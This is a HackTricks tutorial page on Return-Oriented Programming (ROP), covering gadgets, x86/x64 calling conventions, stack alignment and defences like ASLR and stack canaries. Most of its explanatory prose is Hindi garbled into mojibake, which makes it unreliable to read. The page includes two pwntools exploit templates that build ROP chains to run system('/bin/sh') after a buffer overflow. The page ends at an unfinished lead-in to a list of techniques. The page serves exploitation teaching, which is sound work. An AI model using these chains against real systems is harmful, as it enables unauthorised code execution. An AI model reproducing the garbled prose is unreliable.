# ROP - Return Oriented Programing

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Basic Information**

**Return-Oriented Programming (ROP)** рдПрдХ рдЙрдиреНрдирдд рд╢реЛрд╖рдг рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдЬреИрд╕реЗ **No-Execute (NX)** рдпрд╛ **Data Execution Prevention (DEP)** рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╢реЗрд▓рдХреЛрдб рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдмрд╛рдЗрдирд░реА рдпрд╛ рд▓реЛрдб рдХреА рдЧрдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рдХреЛрдб рдХреЗ рдЯреБрдХрдбрд╝реЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ **"gadgets"** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдкреНрд░рддреНрдпреЗрдХ рдЧреЗрдЬреЗрдЯ рдЖрдорддреМрд░ рдкрд░ рдПрдХ `ret` рдирд┐рд░реНрджреЗрд╢ рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░ рдХреЗ рдмреАрдЪ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдпрд╛ рдЕрдВрдХрдЧрдгрд┐рддреАрдп рд╕рдВрдЪрд╛рд▓рди рдХрд░рдиреЗ рдЬреИрд╕реЗ рдЫреЛрдЯреЗ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред рдЗрди рдЧреЗрдЬреЗрдЯреНрд╕ рдХреЛ рдПрдХ рд╕рд╛рде рдЬреЛрдбрд╝рдХрд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдордирдЪрд╛рд╣реЗ рд╕рдВрдЪрд╛рд▓рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреЗрд▓реЛрдб рддреИрдпрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ NX/DEP рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### How ROP Works

1. **Control Flow Hijacking**: рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╡рд╛рд╣ рдХреЛ рд╣рд╛рдИрдЬреИрдХ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ, рдЖрдорддреМрд░ рдкрд░ рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдХреЗ рд╕реНрдЯреИрдХ рдкрд░ рдПрдХ рд╕рд╣реЗрдЬреЗ рдЧрдП рд▓реМрдЯрдиреЗ рдХреЗ рдкрддреЗ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗред
2. **Gadget Chaining**: рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рд░ рд╕рд╛рд╡рдзрд╛рдиреАрдкреВрд░реНрд╡рдХ рдЧреЗрдЬреЗрдЯреНрд╕ рдХрд╛ рдЪрдпрди рдФрд░ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдмрдирд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрдЪреНрдЫрд┐рдд рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреА рдЬрд╛ рд╕рдХреЗрдВред рдЗрд╕рдореЗрдВ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХреЗ рд▓рд┐рдП рддрд░реНрдХ рд╕реЗрдЯ рдХрд░рдирд╛, рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ (рдЬреИрд╕реЗ, `system("/bin/sh")`), рдФрд░ рдХрд┐рд╕реА рднреА рдЖрд╡рд╢реНрдпрдХ рд╕рдлрд╛рдИ рдпрд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдВрдЪрд╛рд▓рди рдХреЛ рд╕рдВрднрд╛рд▓рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
3. **Payload Execution**: рдЬрдм рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝рдВрдХреНрд╢рди рд▓реМрдЯрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ рд╡реИрдз рд╕реНрдерд╛рди рдкрд░ рд▓реМрдЯрдиреЗ рдХреЗ рдмрдЬрд╛рдп рдЧреЗрдЬреЗрдЯреНрд╕ рдХреА рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рджреЗрддрд╛ рд╣реИред

### Tools

рдЖрдорддреМрд░ рдкрд░, рдЧреЗрдЬреЗрдЯреНрд╕ рдХреЛ [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) рдпрд╛ рд╕реАрдзреЗ **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## ROP Chain in x86 Example

### **x86 (32-bit) Calling conventions**

* **cdecl**: рдХреЙрд▓рд░ рд╕реНрдЯреИрдХ рдХреЛ рд╕рд╛рдл рдХрд░рддрд╛ рд╣реИред рдлрд╝рдВрдХреНрд╢рди рддрд░реНрдХреЛрдВ рдХреЛ рдЙрд▓реНрдЯреЗ рдХреНрд░рдо (рджрд╛рдПрдВ рд╕реЗ рдмрд╛рдПрдВ) рдореЗрдВ рд╕реНрдЯреИрдХ рдкрд░ рдзрдХреЗрд▓рд╛ рдЬрд╛рддрд╛ рд╣реИред **рддрд░реНрдХреЛрдВ рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рджрд╛рдПрдВ рд╕реЗ рдмрд╛рдПрдВ рдзрдХреЗрд▓рд╛ рдЬрд╛рддрд╛ рд╣реИред**
* **stdcall**: cdecl рдХреЗ рд╕рдорд╛рди, рд▓реЗрдХрд┐рди рдХреЙрд▓ рдХреА рдЧрдИ рдлрд╝рдВрдХреНрд╢рди рд╕реНрдЯреИрдХ рдХреЛ рд╕рд╛рдл рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реЛрддреА рд╣реИред

### **Finding Gadgets**

рдкрд╣рд▓реЗ, рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ рд╣рдордиреЗ рдмрд╛рдЗрдирд░реА рдпрд╛ рдЗрд╕рдХреЗ рд▓реЛрдб рдХреА рдЧрдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдЧреЗрдЬреЗрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХреА рд╣реИред рдЬрд┐рди рдЧреЗрдЬреЗрдЯреНрд╕ рдореЗрдВ рд╣рдорд╛рд░реА рд░реБрдЪрд┐ рд╣реИ, рд╡реЗ рд╣реИрдВ:

* `pop eax; ret`: рдпрд╣ рдЧреЗрдЬреЗрдЯ рд╕реНрдЯреИрдХ рдХреЗ рд╢реАрд░реНрд╖ рдорд╛рди рдХреЛ `EAX` рд░рдЬрд┐рд╕реНрдЯрд░ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рд▓реМрдЯрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдореЗрдВ `EAX` рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред
* `pop ebx; ret`: рдКрдкрд░ рдХреЗ рд╕рдорд╛рди, рд▓реЗрдХрд┐рди `EBX` рд░рдЬрд┐рд╕реНрдЯрд░ рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рд╕реЗ `EBX` рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред
* `mov [ebx], eax; ret`: `EAX` рдореЗрдВ рдорд╛рди рдХреЛ `EBX` рджреНрд╡рд╛рд░рд╛ рдЗрдВрдЧрд┐рдд рдореЗрдореЛрд░реА рд╕реНрдерд╛рди рдкрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рд▓реМрдЯрддрд╛ рд╣реИред рдЗрд╕реЗ рдЕрдХреНрд╕рд░ **write-what-where gadget** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ `system()` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдЙрдкрд▓рдмреНрдз рд╣реИред

### **ROP Chain**

**pwntools** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рд╣рдо ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рд╕реНрдЯреИрдХ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рддреИрдпрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ `system('/bin/sh')` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ:

1. рд╕рдВрд░реЗрдЦрдг рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ `ret` рдирд┐рд░реНрджреЗрд╢ (рд╡реИрдХрд▓реНрдкрд┐рдХ)
2. `system` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ (рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ ASLR рдЕрдХреНрд╖рдо рд╣реИ рдФрд░ libc рдЬреНрдЮрд╛рдд рд╣реИ, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [**Ret2lib**](ret2lib/) рдореЗрдВ)
3. `system()` рд╕реЗ рд▓реМрдЯрдиреЗ рдХреЗ рдкрддреЗ рдХреЗ рд▓рд┐рдП рдкреНрд▓реЗрд╕рд╣реЛрд▓реНрдбрд░
4. `"/bin/sh"` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдкрддрд╛ (рд╕рд┐рд╕реНрдЯрдо рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдкреИрд░рд╛рдореАрдЯрд░)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Chain in x64 Example

### **x64 (64-bit) Calling conventions**

* **System V AMD64 ABI** рдХреЙрд▓рд┐рдВрдЧ рдХрдиреНрд╡реЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдпреВрдирд┐рдХреНрд╕-рдЬреИрд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд╣рд╛рдБ **рдкрд╣рд▓реЗ рдЫрд╣ рдкреВрд░реНрдгрд╛рдВрдХ рдпрд╛ рдкреЙрдЗрдВрдЯрд░ рддрд░реНрдХ `RDI`, `RSI`, `RDX`, `RCX`, `R8`, рдФрд░ `R9` рд░рдЬрд┐рд╕реНрдЯрд░ рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред рдЕрддрд┐рд░рд┐рдХреНрдд рддрд░реНрдХ рд╕реНрдЯреИрдХ рдкрд░ рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рд▓реМрдЯрдиреЗ рдХрд╛ рдорд╛рди `RAX` рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **Windows x64** рдХреЙрд▓рд┐рдВрдЧ рдХрдиреНрд╡реЗрдВрд╢рди рдкрд╣рд▓реЗ рдЪрд╛рд░ рдкреВрд░реНрдгрд╛рдВрдХ рдпрд╛ рдкреЙрдЗрдВрдЯрд░ рддрд░реНрдХреЛрдВ рдХреЗ рд▓рд┐рдП `RCX`, `RDX`, `R8`, рдФрд░ `R9` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ рдЕрддрд┐рд░рд┐рдХреНрдд рддрд░реНрдХ рд╕реНрдЯреИрдХ рдкрд░ рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рд▓реМрдЯрдиреЗ рдХрд╛ рдорд╛рди `RAX` рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **Registers**: 64-рдмрд┐рдЯ рд░рдЬрд┐рд╕реНрдЯрд░ рдореЗрдВ `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, рдФрд░ `R8` рд╕реЗ `R15` рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

#### **Finding Gadgets**

рд╣рдорд╛рд░реЗ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП, рдЖрдЗрдП рдЙрди рдЧреИрдЬреЗрдЯреНрд╕ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░реЗрдВ рдЬреЛ рд╣рдореЗрдВ **RDI** рд░рдЬрд┐рд╕реНрдЯрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗ (рддрд╛рдХрд┐ **system()** рдХреЛ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ **"/bin/sh"** рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкрд╛рд╕ рдХрд░ рд╕рдХреЗрдВ) рдФрд░ рдлрд┐рд░ **system()** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВред рд╣рдо рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ рд╣рдордиреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЧреИрдЬреЗрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХреА рд╣реИ:

* **pop rdi; ret**: рд╕реНрдЯреИрдХ рдХреЗ рд╢реАрд░реНрд╖ рдорд╛рди рдХреЛ **RDI** рдореЗрдВ рдкреЙрдк рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рд▓реМрдЯрддрд╛ рд╣реИред **system()** рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░реЗ рддрд░реНрдХ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХред
* **ret**: рдПрдХ рд╕рд╛рдзрд╛рд░рдг рд░рд┐рдЯрд░реНрди, рдХреБрдЫ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рд╕реНрдЯреИрдХ рд╕рдВрд░реЗрдЦрдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреАред

рдФрд░ рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ **system()** рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдХреНрдпрд╛ рд╣реИред

### **ROP Chain**

рдиреАрдЪреЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдЬреЛ **pwntools** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **system('/bin/sh')** рдХреЛ **x64** рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЪреЗрди рд╕реЗрдЯрдЕрдк рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
In this example:

* рд╣рдо **`pop rdi; ret`** рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **`RDI`** рдХреЛ **`"/bin/sh"`** рдХреЗ рдкрддреЗ рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* рд╣рдо **`RDI`** рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рд╕реАрдзреЗ **`system()`** рдкрд░ рдХреВрджрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ **system()** рдХрд╛ рдкрддрд╛ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред
* рдпрджрд┐ рд▓рдХреНрд╖рд┐рдд рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ, рддреЛ рд╕рдВрд░реЗрдЦрдг рдХреЗ рд▓рд┐рдП **`ret_gadget`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ **x64** рдореЗрдВ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЙрдЪрд┐рдд рд╕реНрдЯреИрдХ рд╕рдВрд░реЗрдЦрдг рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рд╕рд╛рдорд╛рдиреНрдп рд╣реИред

### Stack Alignment

**x86-64 ABI** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЬрдм **call instruction** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИ, рддреЛ **stack 16-byte aligned** рд╣реЛред **LIBC**, рдкреНрд░рджрд░реНрд╢рди рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **SSE instructions** (рдЬреИрд╕реЗ **movaps**) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЗрд╕ рд╕рдВрд░реЗрдЦрдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдпрджрд┐ рд╕реНрдЯреИрдХ рдареАрдХ рд╕реЗ рд╕рдВрд░реЗрдЦрд┐рдд рдирд╣реАрдВ рд╣реИ (рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ **RSP** 16 рдХрд╛ рдЧреБрдгрд╛рдВрдХ рдирд╣реАрдВ рд╣реИ), рддреЛ **ROP chain** рдореЗрдВ **system** рдЬреИрд╕реЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдХреЙрд▓ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдВрдЧреЗред рдЗрд╕реЗ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЕрдкрдиреЗ ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдореЗрдВ **system** рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдмрд╕ рдПрдХ **ret gadget** рдЬреЛрдбрд╝реЗрдВред

## x86 vs x64 рдореБрдЦреНрдп рдЕрдВрддрд░

{% hint style="success" %}
рдЪреВрдВрдХрд┐ **x64 рдкрд╣рд▓реЗ рдХреБрдЫ рддрд░реНрдХреЛрдВ рдХреЗ рд▓рд┐рдП рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ,** рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЕрдХреНрд╕рд░ рд╕рд░рд▓ рдХрд╛рд░реНрдп рдХреЙрд▓ рдХреЗ рд▓рд┐рдП x86 рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдХрдо рдЧреИрдЬреЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рд╕рд╣реА рдЧреИрдЬреЗрдЯ рдЦреЛрдЬрдиреЗ рдФрд░ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓рддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд░рдЬрд┐рд╕реНрдЯрд░ рдХреА рд╕рдВрдЦреНрдпрд╛ рдФрд░ рдкрддрд╛ рд╕реНрдерд╛рди рдмрдврд╝ рдЬрд╛рддрд╛ рд╣реИред **x64** рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯрд░ рдХреА рдмрдврд╝реА рд╣реБрдИ рд╕рдВрдЦреНрдпрд╛ рдФрд░ рдмрдбрд╝реЗ рдкрддреЗ рдХреЗ рд╕реНрдерд╛рди рдиреЗ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ Return-Oriented Programming (ROP) рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╢реЛрд╖рдг рд╡рд┐рдХрд╛рд╕ рдХреЗ рд▓рд┐рдП рдЕрд╡рд╕рд░ рдФрд░ рдЪреБрдиреМрддрд┐рдпрд╛рдБ рджреЛрдиреЛрдВ рдкреНрд░рджрд╛рди рдХреА рд╣реИрдВред
{% endhint %}

## ROP chain in ARM64 Example

### **ARM64 рдореВрд▓ рдмрд╛рддреЗрдВ рдФрд░ рдХреЙрд▓рд┐рдВрдЧ рд╕рдореНрдореЗрд▓рди**

рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рджреЗрдЦреЗрдВ:

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}



## ROP рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **рдФрд░** [**PIE**](../common-binary-protections-and-bypasses/pie/): рдпреЗ рд╕реБрд░рдХреНрд╖рд╛ ROP рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рдХрдард┐рди рдмрдирд╛рддреА рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЧреИрдЬреЗрдЯ рдХреЗ рдкрддреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдмреАрдЪ рдмрджрд▓рддреЗ рд╣реИрдВред
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/): BOF рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓реМрдЯрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд╡рд╛рдЗрдВрдЯрд░реНрд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдЯреЛрд░ рд╕реНрдЯреИрдХ рдХреИрдирд░реА рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред
* **рдЧреИрдЬреЗрдЯреНрд╕ рдХреА рдХрдореА**: рдпрджрд┐ рдкрд░реНрдпрд╛рдкреНрдд рдЧреИрдЬреЗрдЯ рдирд╣реАрдВ рд╣реИрдВ, рддреЛ ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛрдЧрд╛ред

## ROP рдЖрдзрд╛рд░рд┐рдд рддрдХрдиреАрдХреЗрдВ

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ ROP рдХреЗрд╡рд▓ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдПрдХ рддрдХрдиреАрдХ рд╣реИред ROP рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдХрдИ Ret2XXX рддрдХрдиреАрдХреЗрдВ рд╡рд┐рдХрд╕рд┐рдд рдХреА рдЧрдИ рд╣реИрдВ:

